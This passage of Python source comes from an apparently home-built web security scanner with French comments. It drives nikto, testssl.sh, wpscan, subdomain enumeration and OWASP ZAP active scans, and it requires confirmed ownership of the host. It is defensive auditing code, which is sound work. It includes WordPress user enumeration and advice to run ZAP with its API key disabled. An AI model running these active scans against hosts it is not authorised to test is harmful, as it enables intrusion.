        report_findings.append(_finding(
            "deep:tool:nikto", "nikto non installé — scan serveur web sauté", Threat.MOD,
            "outillage", "Binaire `nikto` introuvable dans le PATH.",
            "Les fichiers par défaut, scripts CGI oubliés et vieilles signatures serveur ne sont pas testés.",
            "apt install nikto / git clone https://github.com/sullo/nikto"))
        return

    proc = _run([NIKTO_BIN, "-h", url, "-Format", "json", "-output", "-", "-ask", "no",
                "-Tuning", "x6"], timeout=600)
    if proc is None or not proc.stdout.strip():
        return
    try:
        data = json.loads(proc.stdout)
    except json.JSONDecodeError:
        return
    vulns = data.get("vulnerabilities", data) if isinstance(data, dict) else data
    if not isinstance(vulns, list):
        return
    for v in vulns:
        if not isinstance(v, dict):
            continue
        msg = v.get("msg", v.get("message", ""))
        if not msg:
            continue
        ref = v.get("id", v.get("references", ""))
        report_findings.append(_finding(
            f"deep:nikto:{ref}:{v.get('url', url)}", f"[nikto] {msg[:90]}", Threat.GILLIAN,
            v.get("url", url), msg, "Signature nikto : fichier/config par défaut ou vieille faille serveur.",
            "Voir le message nikto ci-contre ; généralement supprimer/bloquer le chemin signalé."))


# ---------- 7. testssl.sh : config TLS/SSL ----------

def check_testssl(report_findings, host, step):
    step("testssl.sh (TLS/SSL)")
    if not which(TESTSSL_BIN):
        report_findings.append(_finding(
            "deep:tool:testssl", "testssl.sh non installé — audit TLS sauté", Threat.MOD,
            "outillage", "Binaire `testssl.sh` introuvable dans le PATH.",
            "Protocoles/ciphers obsolètes, certificat invalide ou Heartbleed-like non vérifiés.",
            "git clone https://github.com/drwetter/testssl.sh"))
        return

    proc = _run([TESTSSL_BIN, "--jsonfile-pretty", "/dev/stdout", "--quiet", "--color", "0",
                host], timeout=300)
    if proc is None or not proc.stdout.strip():
        return
    sev_map = {"CRITICAL": Threat.MENOS, "HIGH": Threat.MENOS, "MEDIUM": Threat.ADJUCHAS,
              "LOW": Threat.GILLIAN, "WARN": Threat.GILLIAN, "OK": None, "INFO": None}
    try:
        results = json.loads(proc.stdout[proc.stdout.index("["):proc.stdout.rindex("]") + 1])
    except (ValueError, json.JSONDecodeError):
        return
    for r in results:
        sev = r.get("severity", "")
        threat = sev_map.get(sev)
        if threat is None:
            continue
        report_findings.append(_finding(
            f"deep:tls:{r.get('id', sev)}", f"[TLS] {r.get('finding', r.get('id', 'problème TLS'))[:90]}",
            threat, host, f"id={r.get('id')} sévérité={sev}",
            "Config TLS/SSL faible : chiffrement cassable, protocole obsolète ou certificat invalide.",
            "Suivre la recommandation testssl.sh pour cet id (désactiver le protocole/cipher concerné)."))


# ---------- 8. wpscan : spécifique WordPress (si détecté) ----------

def looks_like_wordpress(html):
    low = html.lower()
    return "wp-content" in low or "wp-includes" in low or "/wp-json/" in low


def check_wpscan(report_findings, url, session, step):
    try:
        home = session.get(url, timeout=TIMEOUT, headers={"User-Agent": UA})
    except requests.RequestException:
        return
    if not looks_like_wordpress(home.text):
        return

    step("wpscan (WordPress détecté)")
    if not which(WPSCAN_BIN):
        report_findings.append(_finding(
            "deep:tool:wpscan", "WordPress détecté mais wpscan non installé", Threat.MOD,
            "outillage", "wp-content/wp-includes vu dans la page, mais `wpscan` introuvable.",
            "Plugins/thèmes vulnérables et énumération d'utilisateurs WordPress non testés.",
            "gem install wpscan (ou apt install wpscan)"))
        return

    proc = _run([WPSCAN_BIN, "--url", url, "--no-update", "--format", "json",
                "-e", "vp,vt,u", "--random-user-agent"], timeout=600)
    if proc is None or not proc.stdout.strip():
        return
    try:
        data = json.loads(proc.stdout)
    except json.JSONDecodeError:
        return

    def emit(kind, name, vulns):
        for v in vulns or []:
            title = v.get("title", "vulnérabilité")
            refs = v.get("references", {})
            report_findings.append(_finding(
                f"deep:wpscan:{kind}:{name}:{title}", f"[WordPress] {kind} « {name} » : {title[:80]}",
                Threat.MENOS, url, title,
                "Plugin/thème/cœur WordPress avec une CVE publique connue.",
                "Mettre à jour le composant concerné immédiatement. Réfs : "
                + ",".join(refs.get("url", []) or ["voir wpscan.com"])))

    for name, p in (data.get("plugins") or {}).items():
        emit("plugin", name, p.get("vulnerabilities"))
    for name, t in (data.get("themes") or {}).items():
        emit("thème", name, t.get("vulnerabilities"))
    core_vulns = (data.get("version") or {}).get("vulnerabilities")
    if core_vulns:
        emit("core", (data.get("version") or {}).get("number", "?"), core_vulns)
    users = (data.get("users") or {})
    if users:
        report_findings.append(_finding(
            "deep:wpscan:users", f"{len(users)} utilisateur(s) WordPress énuméré(s)", Threat.GILLIAN,
            url, ", ".join(users.keys()),
            "Des logins valides facilitent le brute-force et le social engineering.",
            "Masquer les auteurs dans les permaliens/API REST, désactiver l'énumération via /?author=N."))


# ---------- 9. subfinder/amass : surface d'attaque (sous-domaines) ----------

def check_subdomains(report_findings, host, step):
    step("subfinder/amass (sous-domaines)")
    bin_name = SUBFINDER_BIN if which(SUBFINDER_BIN) else (AMASS_BIN if which(AMASS_BIN) else None)
    if bin_name is None:
        report_findings.append(_finding(
            "deep:tool:subfinder", "subfinder/amass non installés — énumération de sous-domaines sautée",
            Threat.MOD, "outillage", "Ni `subfinder` ni `amass` trouvés dans le PATH.",
            "Des sous-domaines oubliés (staging, dev, admin) peuvent rester hors de ta vue.",
            "go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"))
        return

    cmd = [bin_name, "-d", host, "-silent"] if bin_name == SUBFINDER_BIN else \
          [bin_name, "enum", "-passive", "-d", host, "-silent"]
    proc = _run(cmd, timeout=180)
    if proc is None or not proc.stdout.strip():
        return
    subs = sorted({s.strip() for s in proc.stdout.splitlines() if s.strip() and host in s})[:50]
    if not subs:
        return

    def alive(sub):
        for scheme in ("https", "http"):
            try:
                r = requests.get(f"{scheme}://{sub}", timeout=6, headers={"User-Agent": UA},
                                 allow_redirects=False)
                return (sub, scheme, r.status_code)
            except requests.RequestException:
                continue
        return None

    with ThreadPoolExecutor(max_workers=10) as pool:
        live = [r for r in pool.map(alive, subs) if r]

    if live:
        report_findings.append(_finding(
            "deep:subdomains", f"{len(live)} sous-domaine(s) en ligne découvert(s) (sur {len(subs)} connus)",
            Threat.HOLLOW, host,
            ", ".join(f"{s} ({code})" for s, _, code in live[:15]),
            "Chaque sous-domaine est une surface d'attaque séparée (souvent staging/dev moins protégé). "
            "Non scanné automatiquement : hors du périmètre autorisé pour cette exécution.",
            "Vérifier chaque sous-domaine : le relancer avec `bankai` séparément si c'est aussi à toi."))


# ---------- 10. ZAP : spider + active scan via l'API REST ----------

def zap_available():
    try:
        r = requests.get(f"{ZAP_API}/JSON/core/view/version/", timeout=3)
        return r.status_code == 200
    except requests.RequestException:
        return False


def check_zap(report_findings, url, step):
    step("OWASP ZAP (spider + active scan)")
    started = False
    if not zap_available() and tools.zap_image_ready():
        step("démarrage de ZAP (Docker)")
        started = tools.start_zap(zap_available)
    try:
        zap_scan(report_findings, url)
    finally:
        if started:
            tools.stop_zap()


def zap_scan(report_findings, url):
    if not zap_available():
        report_findings.append(_finding(
            "deep:tool:zap", "ZAP non détecté sur 127.0.0.1:8080 — scan ZAP sauté", Threat.MOD,
            "outillage",
            "Aucune instance ZAP daemon ne répond sur l'API locale.",
            "Le spidering + active scan de ZAP (XSS/SQLi/etc. par un second moteur, en recoupement) n'est pas fait.",
            "Lancer `zap.sh -daemon -port 8080 -config api.disablekey=true` avant --deep, ou "
            "`docker run -u zap -p 8080:8080 zaproxy/zap-stable zap.sh -daemon "
            "-host 0.0.0.0 -port 8080 -config api.disablekey=true`."))
        return

    try:
        requests.get(f"{ZAP_API}/JSON/spider/action/scan/", params={"url": url}, timeout=10)
        for _ in range(60):
            r = requests.get(f"{ZAP_API}/JSON/spider/view/status/", timeout=5)
            if int(r.json().get("status", 0)) >= 100:
                break
            time.sleep(2)

        requests.get(f"{ZAP_API}/JSON/ascan/action/scan/", params={"url": url}, timeout=10)
        for _ in range(150):
            r = requests.get(f"{ZAP_API}/JSON/ascan/view/status/", timeout=5)
            if int(r.json().get("status", 0)) >= 100:
                break
            time.sleep(4)

        alerts = requests.get(f"{ZAP_API}/JSON/core/view/alerts/", params={"baseurl": url},
                              timeout=15).json().get("alerts", [])
    except (requests.RequestException, ValueError):
        return

    sev_map = {"High": Threat.MENOS, "Medium": Threat.ADJUCHAS, "Low": Threat.GILLIAN,
              "Informational": Threat.MOD}
    for a in alerts:
        report_findings.append(_finding(
            f"deep:zap:{a.get('pluginId')}:{a.get('url')}", f"[ZAP] {a.get('alert', 'alerte')}",
            sev_map.get(a.get("risk"), Threat.HOLLOW), a.get("url", url),
            a.get("evidence") or a.get("param") or "voir détail ZAP",
            a.get("description", "Alerte remontée par le moteur actif de ZAP."),
            a.get("solution", "Voir la référence ZAP pour le correctif.")))


# ---------- orchestration ----------

ALL_TOOLS = ("nuclei", "nmap", "sqlmap", "nikto", "testssl", "wpscan", "subfinder", "zap")


def scan(url, repo_findings_unused=None, step=lambda _: None, tools=ALL_TOOLS):
    """Passe active complète. Retourne une liste de Finding. N'appeler que sur
    un host dont la propriété a déjà été confirmée par cli.py (--yes)."""
    parsed = urlparse(url)
    root = f"{parsed.scheme}://{parsed.netloc}"
    host = parsed.netloc.split(":")[0]
    session = requests.Session()
    out = []

    # sondes natives : rapides, aucune dépendance externe, toujours lancées
    check_content_discovery(out, root, session, step)
    check_reflection_based(out, url, session, step)
    check_command_injection(out, url, session, step)
    check_http_methods(out, url, session, step)
    check_host_header(out, url, session, step)
    check_jwt(out, url, session, step)
    check_sqli(out, url, session, step)
    check_xxe(out, url, session, step)
    check_nosql_injection(out, url, session, step)
    check_crlf_injection(out, url, session, step)
    check_graphql(out, url, session, step)
    check_insecure_deserialization(out, url, session, step)
    check_js_bundle_secrets(out, url, session, step)
    check_ssrf_metadata(out, url, session, step)

    # moteurs externes : chacun saute proprement (finding "non installé") si absent
    if "nuclei" in tools:
        check_nuclei(out, url, step)
    if "nmap" in tools:
        check_nmap(out, host, step)
    if "nikto" in tools:
        check_nikto(out, url, step)
    if "testssl" in tools and parsed.scheme == "https":
        check_testssl(out, host, step)
    if "wpscan" in tools:
        check_wpscan(out, url, session, step)
    if "subfinder" in tools:
        check_subdomains(out, host, step)
    if "zap" in tools:
        check_zap(out, url, step)

    return out
